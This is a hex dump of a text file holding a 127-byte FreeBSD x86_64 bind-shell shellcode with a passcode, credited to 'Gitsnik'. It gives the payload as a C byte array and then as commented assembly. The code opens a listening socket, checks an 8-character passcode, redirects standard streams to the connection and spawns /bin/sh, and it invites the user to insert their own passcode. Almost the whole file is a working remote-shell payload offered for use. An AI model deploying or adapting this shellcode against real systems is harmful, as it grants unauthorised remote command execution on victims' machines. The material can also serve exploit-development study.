00000000  2f 2a 0a 2a 20 47 69 74  73 6e 69 6b 2c 20 40 64  |/*.* Gitsnik, @d|
00000010  72 61 63 79 72 79 73 0a  2a 20 46 72 65 65 42 53  |racyrys.* FreeBS|
00000020  44 20 78 38 36 5f 36 34  20 62 69 6e 64 5f 74 63  |D x86_64 bind_tc|
00000030  70 20 77 69 74 68 20 70  61 73 73 63 6f 64 65 2c  |p with passcode,|
00000040  20 31 32 37 20 62 79 74  65 73 0a 2a 20 50 61 73  | 127 bytes.* Pas|
00000050  73 63 6f 64 65 3a 20 52  32 43 42 77 30 63 72 0a  |scode: R2CBw0cr.|
00000060  2a 2f 0a 0a 43 20 53 6f  75 72 63 65 3a 0a 0a 63  |*/..C Source:..c|
00000070  68 61 72 20 63 6f 64 65  5b 5d 20 3d 20 5c 0a 22  |har code[] = \."|
00000080  5c 78 36 61 5c 78 36 31  5c 78 35 38 5c 78 36 61  |\x6a\x61\x58\x6a|
00000090  5c 78 30 32 5c 78 35 66  5c 78 36 61 5c 78 30 31  |\x02\x5f\x6a\x01|
000000a0  5c 78 35 65 5c 78 39 39  22 0a 22 5c 78 30 66 5c  |\x5e\x99"."\x0f\|
000000b0  78 30 35 5c 78 34 38 5c  78 39 37 5c 78 62 61 5c  |x05\x48\x97\xba\|
000000c0  78 66 66 5c 78 30 32 5c  78 61 61 5c 78 61 61 5c  |xff\x02\xaa\xaa\|
000000d0  78 38 30 22 0a 22 5c 78  66 32 5c 78 66 66 5c 78  |x80"."\xf2\xff\x|
000000e0  35 32 5c 78 34 38 5c 78  38 39 5c 78 65 36 5c 78  |52\x48\x89\xe6\x|
000000f0  39 39 5c 78 30 34 5c 78  36 36 5c 78 38 30 22 0a  |99\x04\x66\x80".|
00000100  22 5c 78 63 32 5c 78 31  30 5c 78 30 66 5c 78 30  |"\xc2\x10\x0f\x0|
00000110  35 5c 78 30 34 5c 78 36  61 5c 78 30 66 5c 78 30  |5\x04\x6a\x0f\x0|
00000120  35 5c 78 30 34 5c 78 31  65 22 0a 22 5c 78 34 38  |5\x04\x1e"."\x48|
00000130  5c 78 33 31 5c 78 66 36  5c 78 39 39 5c 78 30 66  |\x31\xf6\x99\x0f|
00000140  5c 78 30 35 5c 78 34 38  5c 78 39 37 5c 78 36 61  |\x05\x48\x97\x6a|
00000150  5c 78 30 33 22 0a 22 5c  78 35 38 5c 78 35 32 5c  |\x03"."\x58\x52\|
00000160  78 34 38 5c 78 38 64 5c  78 37 34 5c 78 32 34 5c  |x48\x8d\x74\x24\|
00000170  78 66 30 5c 78 38 30 5c  78 63 32 5c 78 31 30 22  |xf0\x80\xc2\x10"|
00000180  0a 22 5c 78 30 66 5c 78  30 35 5c 78 34 38 5c 78  |."\x0f\x05\x48\x|
00000190  62 38 5c 78 35 32 5c 78  33 32 5c 78 34 33 5c 78  |b8\x52\x32\x43\x|
000001a0  34 32 5c 78 37 37 5c 78  33 30 22 0a 22 5c 78 36  |42\x77\x30"."\x6|
000001b0  33 5c 78 37 32 5c 78 35  37 5c 78 34 38 5c 78 38  |3\x72\x57\x48\x8|
000001c0  64 5c 78 33 65 5c 78 34  38 5c 78 61 66 5c 78 37  |d\x3e\x48\xaf\x7|
000001d0  34 5c 78 30 38 22 0a 22  5c 78 34 38 5c 78 33 31  |4\x08"."\x48\x31|
000001e0  5c 78 63 30 5c 78 34 38  5c 78 66 66 5c 78 63 30  |\xc0\x48\xff\xc0|
000001f0  5c 78 30 66 5c 78 30 35  5c 78 35 66 5c 78 34 38  |\x0f\x05\x5f\x48|
00000200  22 0a 22 5c 78 38 39 5c  78 64 30 5c 78 34 38 5c  |"."\x89\xd0\x48\|
00000210  78 38 39 5c 78 66 65 5c  78 34 38 5c 78 66 66 5c  |x89\xfe\x48\xff\|
00000220  78 63 65 5c 78 62 30 5c  78 35 61 22 0a 22 5c 78  |xce\xb0\x5a"."\x|
00000230  30 66 5c 78 30 35 5c 78  37 35 5c 78 66 37 5c 78  |0f\x05\x75\xf7\x|
00000240  39 39 5c 78 30 34 5c 78  33 62 5c 78 34 38 5c 78  |99\x04\x3b\x48\x|
00000250  62 62 5c 78 32 66 22 0a  22 5c 78 36 32 5c 78 36  |bb\x2f"."\x62\x6|
00000260  39 5c 78 36 65 5c 78 32  66 5c 78 32 66 5c 78 37  |9\x6e\x2f\x2f\x7|
00000270  33 5c 78 36 38 5c 78 35  32 5c 78 35 33 5c 78 35  |3\x68\x52\x53\x5|
00000280  34 22 0a 22 5c 78 35 66  5c 78 35 32 5c 78 35 37  |4"."\x5f\x52\x57|
00000290  5c 78 35 34 5c 78 35 65  5c 78 30 66 5c 78 30 35  |\x54\x5e\x0f\x05|
000002a0  22 3b 0a 0a 41 73 73 65  6d 62 6c 79 20 49 6e 74  |";..Assembly Int|
000002b0  65 6c 20 53 6f 75 72 63  65 3a 0a 0a 67 6c 6f 62  |el Source:..glob|
000002c0  61 6c 20 5f 73 74 61 72  74 0a 0a 3b 0a 3b 20 42  |al _start..;.; B|
000002d0  69 6e 64 73 68 65 6c 6c  20 69 6e 20 36 34 20 62  |indshell in 64 b|
000002e0  69 74 20 73 68 65 6c 6c  63 6f 64 65 20 28 77 72  |it shellcode (wr|
000002f0  69 74 74 65 6e 0a 3b 20  61 6e 64 20 74 65 73 74  |itten.; and test|
00000300  65 64 20 6f 6e 20 61 20  46 72 65 65 42 53 44 20  |ed on a FreeBSD |
00000310  39 2e 31 20 41 4d 44 36  34 20 4f 53 29 0a 3b 0a  |9.1 AMD64 OS).;.|
00000320  3b 20 41 75 74 68 6f 72  3a 20 47 69 74 73 6e 69  |; Author: Gitsni|
00000330  6b 0a 3b 20 54 77 69 74  74 65 72 3a 20 40 64 72  |k.; Twitter: @dr|
00000340  61 63 79 72 79 73 0a 3b  20 50 61 73 73 63 6f 64  |acyrys.; Passcod|
00000350  65 3a 20 52 32 43 42 77  30 63 72 0a 3b 20 31 32  |e: R2CBw0cr.; 12|
00000360  37 20 62 79 74 65 73 0a  3b 0a 0a 73 65 63 74 69  |7 bytes.;..secti|
00000370  6f 6e 20 2e 74 65 78 74  0a 0a 5f 73 74 61 72 74  |on .text.._start|
00000380  3a 0a 3b 0a 3b 20 69 6e  74 20 73 6f 63 6b 65 74  |:.;.; int socket|
00000390  28 20 32 2c 20 31 2c 20  30 20 29 0a 3b 0a 3b 20  |( 2, 1, 0 ).;.; |
000003a0  73 6f 63 6b 65 74 20 77  69 6c 6c 20 72 65 74 75  |socket will retu|
000003b0  72 6e 20 61 20 73 6f 63  6b 65 74 20 69 6e 74 6f  |rn a socket into|
000003c0  20 72 61 78 0a 3b 0a 3b  20 31 32 20 62 79 74 65  | rax.;.; 12 byte|
000003d0  73 0a 3b 0a 70 75 73 68  20 62 79 74 65 20 30 78  |s.;.push byte 0x|
000003e0  36 31 0a 70 6f 70 20 72  61 78 0a 70 75 73 68 20  |61.pop rax.push |
000003f0  62 79 74 65 20 30 78 30  32 0a 70 6f 70 20 72 64  |byte 0x02.pop rd|
00000400  69 0a 70 75 73 68 20 62  79 74 65 20 30 78 30 31  |i.push byte 0x01|
00000410  0a 70 6f 70 20 72 73 69  0a 63 64 71 20 20 3b 20  |.pop rsi.cdq  ; |
00000420  72 64 78 20 69 73 20 6e  75 6c 6c 0a 73 79 73 63  |rdx is null.sysc|
00000430  61 6c 6c 20 20 3b 20 73  6f 63 6b 65 74 28 20 32  |all  ; socket( 2|
00000440  2c 20 31 2c 20 30 20 29  0a 0a 3b 0a 3b 20 53 77  |, 1, 0 )..;.; Sw|
00000450  61 70 20 6f 75 72 20 73  6f 63 6b 65 74 20 66 72  |ap our socket fr|
00000460  6f 6d 20 52 41 58 20 69  6e 74 6f 20 52 44 49 20  |om RAX into RDI |
00000470  77 68 69 63 68 20 69 73  20 77 68 65 72 65 0a 3b  |which is where.;|
00000480  20 74 68 65 20 6e 65 78  74 20 66 65 77 20 66 75  | the next few fu|
00000490  6e 63 74 69 6f 6e 73 20  77 61 6e 74 20 69 74 20  |nctions want it |
000004a0  61 6e 79 77 61 79 0a 3b  0a 3b 20 78 63 68 67 20  |anyway.;.; xchg |
000004b0  69 73 20 31 20 62 79 74  65 20 73 68 6f 72 74 65  |is 1 byte shorte|
000004c0  72 20 74 68 61 6e 20 6d  6f 76 0a 3b 0a 3b 20 32  |r than mov.;.; 2|
000004d0  20 62 79 74 65 73 0a 78  63 68 67 20 72 64 69 2c  | bytes.xchg rdi,|
000004e0  20 72 61 78 20 20 20 20  3b 20 73 6f 63 6b 65 74  | rax    ; socket|
000004f0  20 69 6e 20 72 64 69 20  66 6f 72 20 62 69 6e 64  | in rdi for bind|
00000500  28 29 20 72 61 78 20 69  73 20 6e 6f 77 20 32 0a  |() rax is now 2.|
00000510  0a 3b 0a 3b 20 62 69 6e  64 28 20 73 6f 63 6b 66  |.;.; bind( sockf|
00000520  64 2c 20 2a 61 64 64 72  2c 20 61 64 64 72 6c 65  |d, *addr, addrle|
00000530  6e 20 29 0a 3b 0a 3b 20  57 65 20 6e 65 65 64 20  |n ).;.; We need |
00000540  74 6f 20 73 65 74 20 75  70 20 6f 75 72 20 73 65  |to set up our se|
00000550  72 76 5f 61 64 64 72 20  28 77 68 69 63 68 20 77  |rv_addr (which w|
00000560  65 20 6b 6e 6f 77 20 69  73 20 30 2c 70 6f 72 74  |e know is 0,port|
00000570  2c 32 29 0a 3b 20 53 6f  20 6c 6f 61 64 20 69 74  |,2).; So load it|
00000580  20 61 6c 6c 20 69 6e 74  6f 20 52 41 58 20 61 6e  | all into RAX an|
00000590  64 20 70 75 73 68 20 74  68 61 74 2e 20 4e 6f 74  |d push that. Not|
000005a0  65 20 74 68 61 74 20 62  65 63 61 75 73 65 20 77  |e that because w|
000005b0  65 20 77 61 6e 74 0a 3b  20 37 20 62 79 74 65 73  |e want.; 7 bytes|
000005c0  20 62 75 74 20 74 68 65  20 72 65 67 69 73 74 65  | but the registe|
000005d0  72 20 69 73 20 38 2c 20  77 65 20 70 61 64 20 30  |r is 8, we pad 0|
000005e0  78 66 66 20 6f 6e 74 6f  20 74 68 65 20 62 61 63  |xff onto the bac|
000005f0  6b 20 61 6e 64 20 74 68  65 6e 0a 3b 20 78 6f 72  |k and then.; xor|
00000600  20 69 74 20 74 6f 20 6e  75 6c 6c 20 74 6f 20 6c  | it to null to l|
00000610  69 6e 65 20 65 76 65 72  79 74 68 69 6e 67 20 75  |ine everything u|
00000620  70 2e 0a 3b 0a 3b 20 32  30 20 62 79 74 65 73 0a  |p..;.; 20 bytes.|
00000630  0a 6d 6f 76 20 65 64 78  2c 20 30 78 61 61 61 61  |.mov edx, 0xaaaa|
00000640  30 32 66 66 0a 78 6f 72  20 64 6c 2c 20 30 78 66  |02ff.xor dl, 0xf|
00000650  66 0a 70 75 73 68 20 72  64 78 0a 6d 6f 76 20 72  |f.push rdx.mov r|
00000660  73 69 2c 20 72 73 70 20  20 20 20 20 3b 20 72 73  |si, rsp     ; rs|
00000670  69 20 70 6f 69 6e 74 73  20 74 6f 20 6f 75 72 20  |i points to our |
00000680  73 6f 63 6b 61 64 64 72  20 2a 0a 0a 63 64 71 20  |sockaddr *..cdq |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 72  |             ; r|
000006a0  65 73 65 74 20 52 44 58  0a 61 64 64 20 61 6c 2c  |eset RDX.add al,|
000006b0  20 30 78 36 36 20 20 20  20 20 3b 20 62 69 6e 64  | 0x66     ; bind|
000006c0  28 29 20 69 73 20 30 78  36 38 20 62 75 74 20 72  |() is 0x68 but r|
000006d0  61 78 20 69 73 20 61 6c  72 65 61 64 79 20 30 78  |ax is already 0x|
000006e0  30 32 0a 61 64 64 20 64  6c 2c 20 30 78 31 30 20  |02.add dl, 0x10 |
000006f0  20 20 20 20 3b 20 31 36  20 28 73 69 7a 65 6f 66  |    ; 16 (sizeof|
00000700  29 0a 73 79 73 63 61 6c  6c 0a 0a 3b 0a 3b 20 6c  |).syscall..;.; l|
00000710  69 73 74 65 6e 20 69 73  20 30 78 36 61 0a 3b 0a  |isten is 0x6a.;.|
00000720  3b 20 6c 69 73 74 65 6e  28 20 73 6f 63 6b 66 64  |; listen( sockfd|
00000730  2c 20 62 61 63 6b 6c 6f  67 20 29 0a 3b 0a 3b 20  |, backlog ).;.; |
00000740  62 69 6e 64 28 29 20 72  65 74 75 72 6e 73 20 30  |bind() returns 0|
00000750  20 6f 6e 20 73 75 63 63  65 73 73 2c 20 73 6f 20  | on success, so |
00000760  61 64 64 20 61 6c 2c 20  52 44 49 20 61 6c 72 65  |add al, RDI alre|
00000770  61 64 79 20 70 6f 69 6e  74 73 20 61 74 20 6f 75  |ady points at ou|
00000780  72 0a 3b 20 73 6f 63 6b  66 64 2c 20 61 6e 64 20  |r.; sockfd, and |
00000790  77 65 20 64 6f 6e 27 74  20 63 61 72 65 20 77 68  |we don't care wh|
000007a0  61 74 27 73 20 69 6e 20  62 61 63 6b 6c 6f 67 20  |at's in backlog |
000007b0  62 75 74 20 62 65 63 61  75 73 65 20 69 74 27 73  |but because it's|
000007c0  20 61 0a 3b 20 73 74 61  63 6b 20 70 6f 69 6e 74  | a.; stack point|
000007d0  65 72 20 66 72 6f 6d 20  61 20 66 65 77 20 6c 69  |er from a few li|
000007e0  6e 65 73 20 62 61 63 6b  20 74 68 65 20 6e 75 6d  |nes back the num|
000007f0  62 65 72 20 69 73 20 73  75 66 66 69 63 69 65 6e  |ber is sufficien|
00000800  74 6c 79 20 68 69 67 68  0a 3b 20 74 68 61 74 20  |tly high.; that |
00000810  69 74 20 64 6f 65 73 6e  27 74 20 6d 61 74 74 65  |it doesn't matte|
00000820  72 2e 0a 3b 0a 3b 20 34  20 62 79 74 65 73 0a 0a  |r..;.; 4 bytes..|
00000830  61 64 64 20 61 6c 2c 20  30 78 36 61 0a 73 79 73  |add al, 0x6a.sys|
00000840  63 61 6c 6c 0a 0a 3b 0a  3b 20 61 63 63 65 70 74  |call..;.; accept|
00000850  28 20 73 6f 63 6b 66 64  2c 20 30 2c 20 30 20 29  |( sockfd, 0, 0 )|
00000860  0a 3b 0a 3b 20 61 63 63  65 70 74 28 29 20 77 69  |.;.; accept() wi|
00000870  6c 6c 20 72 65 74 75 72  6e 20 61 20 6e 65 77 20  |ll return a new |
00000880  73 6f 63 6b 66 64 20 66  6f 72 20 75 73 2e 0a 3b  |sockfd for us..;|
00000890  0a 3b 20 38 20 62 79 74  65 73 0a 3b 0a 61 64 64  |.; 8 bytes.;.add|
000008a0  20 61 6c 2c 20 30 78 31  65 0a 78 6f 72 20 72 73  | al, 0x1e.xor rs|
000008b0  69 2c 20 72 73 69 0a 63  64 71 0a 73 79 73 63 61  |i, rsi.cdq.sysca|
000008c0  6c 6c 0a 0a 3b 0a 3b 20  72 65 61 64 28 20 73 6f  |ll..;.; read( so|
000008d0  63 6b 65 74 2c 20 62 75  66 66 65 72 2c 20 6c 65  |cket, buffer, le|
000008e0  6e 67 74 68 20 29 0a 3b  0a 3b 20 43 61 6c 6c 73  |ngth ).;.; Calls|
000008f0  20 73 68 6f 75 6c 64 20  72 65 61 64 3a 0a 3b 20  | should read:.; |
00000900  72 61 78 3a 20 73 79 73  63 61 6c 6c 20 6e 75 6d  |rax: syscall num|
00000910  62 65 72 20 28 30 78 30  33 20 6f 6e 20 46 72 65  |ber (0x03 on Fre|
00000920  65 42 53 44 29 0a 3b 20  72 64 69 3a 20 63 6c 69  |eBSD).; rdi: cli|
00000930  65 6e 74 20 73 6f 63 6b  65 74 0a 3b 20 72 73 69  |ent socket.; rsi|
00000940  3a 20 62 75 66 66 65 72  20 61 64 64 72 65 73 73  |: buffer address|
00000950  0a 3b 20 72 64 78 3a 20  72 65 61 64 20 73 69 7a  |.; rdx: read siz|
00000960  65 20 28 30 78 66 29 0a  3b 0a 3b 20 57 65 20 74  |e (0xf).;.; We t|
00000970  61 6b 65 20 74 68 65 20  72 65 74 75 72 6e 65 64  |ake the returned|
00000980  20 73 6f 63 6b 66 64 20  28 20 63 6c 69 65 6e 74  | sockfd ( client|
00000990  20 29 20 66 72 6f 6d 20  72 61 78 20 61 6e 64 20  | ) from rax and |
000009a0  6c 6f 61 64 20 69 74 20  69 6e 74 6f 20 72 64 69  |load it into rdi|
000009b0  0a 3b 20 61 73 20 6f 75  72 20 73 65 63 6f 6e 64  |.; as our second|
000009c0  20 61 72 67 75 6d 65 6e  74 2e 20 57 65 20 73 65  | argument. We se|
000009d0  74 20 52 41 58 20 74 6f  20 62 65 20 30 78 30 33  |t RAX to be 0x03|
000009e0  2c 20 61 73 20 74 68 69  73 20 69 73 20 74 68 65  |, as this is the|
000009f0  20 73 79 73 63 61 6c 6c  0a 3b 20 49 44 20 28 72  | syscall.; ID (r|
00000a00  65 66 65 72 65 6e 63 65  3a 20 2f 75 73 72 2f 69  |eference: /usr/i|
00000a10  6e 63 6c 75 64 65 2f 73  79 73 2f 73 79 73 63 61  |nclude/sys/sysca|
00000a20  6c 6c 2e 68 29 0a 3b 0a  3b 20 53 65 74 20 72 73  |ll.h).;.; Set rs|
00000a30  69 20 74 6f 20 62 65 20  72 73 70 2d 30 78 66 20  |i to be rsp-0xf |
00000a40  74 6f 20 67 69 76 65 20  75 73 20 30 78 66 20 62  |to give us 0xf b|
00000a50  79 74 65 73 20 6f 66 20  73 70 61 63 65 20 66 6f  |ytes of space fo|
00000a60  72 20 61 20 62 75 66 66  65 72 0a 3b 20 61 6e 64  |r a buffer.; and|
00000a70  20 73 65 74 20 64 6c 20  74 6f 20 62 65 20 6f 75  | set dl to be ou|
00000a80  72 20 6c 65 6e 67 74 68  2e 20 52 44 58 20 69 73  |r length. RDX is|
00000a90  20 73 74 69 6c 6c 20 6e  75 6c 6c 20 62 65 63 61  | still null beca|
00000aa0  75 73 65 20 6f 66 20 74  68 65 20 63 64 71 20 77  |use of the cdq w|
00000ab0  65 0a 3b 20 64 69 64 20  65 61 72 6c 69 65 72 2e  |e.; did earlier.|
00000ac0  0a 3b 0a 3b 20 57 68 65  6e 20 77 65 20 61 72 65  |.;.; When we are|
00000ad0  20 66 69 6e 69 73 68 65  64 20 52 41 58 20 77 69  | finished RAX wi|
00000ae0  6c 6c 20 62 65 20 74 68  65 20 6e 75 6d 62 65 72  |ll be the number|
00000af0  20 6f 66 20 62 79 74 65  73 20 72 65 61 64 20 66  | of bytes read f|
00000b00  72 6f 6d 20 74 68 65 20  73 6f 63 6b 65 74 0a 3b  |rom the socket.;|
00000b10  20 52 44 49 20 77 69 6c  6c 20 62 65 20 6f 75 72  | RDI will be our|
00000b20  20 63 6c 69 65 6e 74 20  73 6f 63 6b 65 74 0a 3b  | client socket.;|
00000b30  20 52 53 49 20 77 69 6c  6c 20 63 6f 6e 74 61 69  | RSI will contai|
00000b40  6e 20 74 68 65 20 70 6f  69 6e 74 65 72 20 74 6f  |n the pointer to|
00000b50  20 6f 75 72 20 73 74 72  69 6e 67 20 66 6f 72 20  | our string for |
00000b60  70 61 73 73 63 6f 64 65  20 63 6f 6d 70 61 72 69  |passcode compari|
00000b70  73 6f 6e 0a 3b 20 52 44  58 20 77 69 6c 6c 20 62  |son.; RDX will b|
00000b80  65 20 30 78 30 30 30 30  30 30 30 30 30 30 30 30  |e 0x000000000000|
00000b90  30 30 30 46 0a 3b 0a 3b  20 31 36 20 62 79 74 65  |000F.;.; 16 byte|
00000ba0  73 0a 0a 78 63 68 67 20  72 64 69 2c 20 72 61 78  |s..xchg rdi, rax|
00000bb0  0a 70 75 73 68 20 62 79  74 65 20 30 78 30 33 20  |.push byte 0x03 |
00000bc0  20 20 3b 20 30 78 30 33  20 69 73 20 72 65 61 64  |  ; 0x03 is read|
00000bd0  28 29 20 69 6e 20 46 72  65 65 42 53 44 0a 70 6f  |() in FreeBSD.po|
00000be0  70 20 72 61 78 0a 70 75  73 68 20 72 64 78 20 20  |p rax.push rdx  |
00000bf0  20 20 20 20 20 20 20 3b  20 53 74 69 6c 6c 20 6e  |       ; Still n|
00000c00  75 6c 6c 20 66 72 6f 6d  20 63 64 71 20 75 70 20  |ull from cdq up |
00000c10  74 6f 70 2e 0a 6c 65 61  20 72 73 69 2c 20 5b 72  |top..lea rsi, [r|
00000c20  73 70 2d 30 78 31 30 5d  0a 61 64 64 20 64 6c 2c  |sp-0x10].add dl,|
00000c30  20 30 78 31 30 0a 73 79  73 63 61 6c 6c 0a 0a 3b  | 0x10.syscall..;|
00000c40  0a 3b 20 72 73 69 20 68  61 73 20 6f 75 72 20 73  |.; rsi has our s|
00000c50  74 72 69 6e 67 2c 20 72  64 69 20 63 6c 69 65 6e  |tring, rdi clien|
00000c60  74 20 73 6f 63 6b 65 74  0a 3b 0a 3b 20 31 38 20  |t socket.;.; 18 |
00000c70  62 79 74 65 73 0a 3b 0a  6d 6f 76 20 72 61 78 2c  |bytes.;.mov rax,|
00000c80  20 30 78 37 32 36 33 33  30 37 37 34 32 34 33 33  | 0x7263307742433|
00000c90  32 35 32 20 3b 20 52 65  70 6c 61 63 65 20 79 6f  |252 ; Replace yo|
00000ca0  75 72 20 38 20 63 68 61  72 61 63 74 65 72 20 70  |ur 8 character p|
00000cb0  61 73 73 63 6f 64 65 20  68 65 72 65 2e 0a 70 75  |asscode here..pu|
00000cc0  73 68 20 72 64 69 20 20  20 20 20 20 20 20 20 20  |sh rdi          |
00000cd0  20 20 20 20 20 20 20 20  20 20 3b 20 73 61 76 65  |          ; save|
00000ce0  20 74 68 65 20 73 6f 63  6b 65 74 0a 6c 65 61 20  | the socket.lea |
00000cf0  72 64 69 2c 20 5b 72 73  69 5d 0a 73 63 61 73 71  |rdi, [rsi].scasq|
00000d00  0a 6a 7a 20 64 75 70 32  73 65 74 75 70 0a 0a 3b  |.jz dup2setup..;|
00000d10  0a 3b 20 45 78 69 74 0a  3b 0a 3b 20 38 20 62 79  |.; Exit.;.; 8 by|
00000d20  74 65 73 0a 3b 0a 78 6f  72 20 72 61 78 2c 20 72  |tes.;.xor rax, r|
00000d30  61 78 0a 69 6e 63 20 72  61 78 0a 73 79 73 63 61  |ax.inc rax.sysca|
00000d40  6c 6c 0a 0a 3b 0a 3b 20  53 65 74 75 70 20 66 6f  |ll..;.; Setup fo|
00000d50  72 20 64 75 70 32 20 6c  6f 6f 70 0a 3b 0a 3b 20  |r dup2 loop.;.; |
00000d60  37 20 62 79 74 65 73 0a  3b 0a 64 75 70 32 73 65  |7 bytes.;.dup2se|
00000d70  74 75 70 3a 0a 70 6f 70  20 72 64 69 0a 6d 6f 76  |tup:.pop rdi.mov|
00000d80  20 72 61 78 2c 20 72 64  78 20 20 20 20 3b 20 52  | rax, rdx    ; R|
00000d90  44 58 20 69 73 20 64 6c  2c 20 30 78 31 30 20 62  |DX is dl, 0x10 b|
00000da0  75 74 20 6f 74 68 65 72  77 69 73 65 20 30 78 30  |ut otherwise 0x0|
00000db0  30 0a 3b 20 73 6f 20 77  65 20 63 61 6e 20 64 6f  |0.; so we can do|
00000dc0  20 74 68 69 73 20 61 6e  64 20 74 68 65 6e 20 6a  | this and then j|
00000dd0  75 73 74 20 63 6f 72 72  65 63 74 0a 3b 20 69 6e  |ust correct.; in|
00000de0  20 74 68 65 20 64 75 70  32 20 6c 6f 6f 70 2e 0a  | the dup2 loop..|
00000df0  6d 6f 76 20 72 73 69 2c  20 72 64 69 0a 0a 3b 0a  |mov rsi, rdi..;.|
00000e00  3b 20 64 75 70 32 20 6c  6f 6f 70 0a 3b 0a 3b 20  |; dup2 loop.;.; |
00000e10  39 20 62 79 74 65 73 0a  64 75 70 32 3a 0a 64 65  |9 bytes.dup2:.de|
00000e20  63 20 72 73 69 0a 6d 6f  76 20 61 6c 2c 20 30 78  |c rsi.mov al, 0x|
00000e30  35 61 0a 73 79 73 63 61  6c 6c 0a 6a 6e 7a 20 64  |5a.syscall.jnz d|
00000e40  75 70 32 0a 0a 3b 0a 3b  20 4e 6f 77 20 66 6f 72  |up2..;.; Now for|
00000e50  20 74 68 65 20 62 69 67  20 6f 6e 65 2e 20 4c 65  | the big one. Le|
00000e60  74 27 73 20 73 65 74 20  75 70 20 6f 75 72 20 65  |t's set up our e|
00000e70  78 65 63 76 65 28 29 0a  3b 0a 3b 20 41 74 20 74  |xecve().;.; At t|
00000e80  68 69 73 20 70 6f 69 6e  74 20 52 41 58 20 69 73  |his point RAX is|
00000e90  20 30 20 73 6f 20 6a 75  73 74 20 6e 75 6c 6c 20  | 0 so just null |
00000ea0  6f 75 74 20 72 64 78 0a  3b 0a 3b 20 57 65 20 6e  |out rdx.;.; We n|
00000eb0  65 65 64 20 72 64 78 20  74 6f 20 62 65 20 6e 75  |eed rdx to be nu|
00000ec0  6c 6c 20 66 6f 72 20 74  68 65 20 33 72 64 20 61  |ll for the 3rd a|
00000ed0  72 67 75 6d 65 6e 74 20  74 6f 20 65 78 65 63 76  |rgument to execv|
00000ee0  65 28 29 0a 3b 0a 3b 20  32 33 20 62 79 74 65 73  |e().;.; 23 bytes|
00000ef0  0a 63 64 71 0a 0a 61 64  64 20 61 6c 2c 20 30 78  |.cdq..add al, 0x|
00000f00  33 62 20 20 20 20 20 3b  20 65 78 65 63 76 65 28  |3b     ; execve(|
00000f10  29 0a 6d 6f 76 20 72 62  78 2c 20 30 78 36 38 37  |).mov rbx, 0x687|
00000f20  33 32 66 32 66 36 65 36  39 36 32 32 66 20 3b 20  |32f2f6e69622f ; |
00000f30  68 73 2f 2f 6e 69 62 2f  0a 0a 3b 20 41 72 67 75  |hs//nib/..; Argu|
00000f40  6d 65 6e 74 20 6f 6e 65  20 73 68 65 6c 6c 5b 30  |ment one shell[0|
00000f50  5d 20 3d 20 22 2f 62 69  6e 2f 2f 73 68 22 0a 70  |] = "/bin//sh".p|
00000f60  75 73 68 20 72 64 78 20  20 20 20 20 3b 20 6e 75  |ush rdx     ; nu|
00000f70  6c 6c 0a 70 75 73 68 20  72 62 78 20 20 20 20 20  |ll.push rbx     |
00000f80  3b 20 68 73 2f 2f 6e 69  62 2f 0a 0a 3b 20 57 65  |; hs//nib/..; We|
00000f90  20 6e 65 65 64 20 70 6f  69 6e 74 65 72 73 20 66  | need pointers f|
00000fa0  6f 72 20 65 78 65 63 76  65 28 29 0a 70 75 73 68  |or execve().push|
00000fb0  20 72 73 70 20 20 20 20  20 3b 20 2a 70 6f 69 6e  | rsp     ; *poin|
00000fc0  74 65 72 20 74 6f 20 73  68 65 6c 6c 5b 30 5d 0a  |ter to shell[0].|
00000fd0  70 6f 70 20 72 64 69 20  20 3b 20 41 72 67 75 6d  |pop rdi  ; Argum|
00000fe0  65 6e 74 20 31 0a 0a 3b  20 41 72 67 75 6d 65 6e  |ent 1..; Argumen|
00000ff0  74 20 74 77 6f 20 73 68  65 6c 6c 20 28 69 6e 63  |t two shell (inc|
00001000  6c 75 64 69 6e 67 20 61  64 64 72 65 73 73 20 6f  |luding address o|
00001010  66 20 65 61 63 68 20 61  72 67 75 6d 65 6e 74 20  |f each argument |
00001020  69 6e 20 61 72 72 61 79  29 0a 70 75 73 68 20 72  |in array).push r|
00001030  64 78 20 20 20 20 20 3b  20 6e 75 6c 6c 0a 70 75  |dx     ; null.pu|
00001040  73 68 20 72 64 69 20 20  20 20 20 3b 20 61 64 64  |sh rdi     ; add|
00001050  72 65 73 73 20 6f 66 20  73 68 65 6c 6c 5b 30 5d  |ress of shell[0]|
00001060  0a 0a 3b 20 57 65 20 6e  65 65 64 20 70 6f 69 6e  |..; We need poin|
00001070  74 65 72 73 20 66 6f 72  20 65 78 65 63 76 65 28  |ters for execve(|
00001080  29 0a 70 75 73 68 20 72  73 70 20 20 20 20 20 3b  |).push rsp     ;|
00001090  20 61 64 64 72 65 73 73  20 6f 66 20 63 68 61 72  | address of char|
000010a0  20 2a 20 73 68 65 6c 6c  0a 70 6f 70 20 72 73 69  | * shell.pop rsi|
000010b0  20 20 20 20 20 20 3b 20  41 72 67 75 6d 65 6e 74  |      ; Argument|
000010c0  20 32 0a 0a 73 79 73 63  61 6c 6c                 | 2..syscall|
000010cb
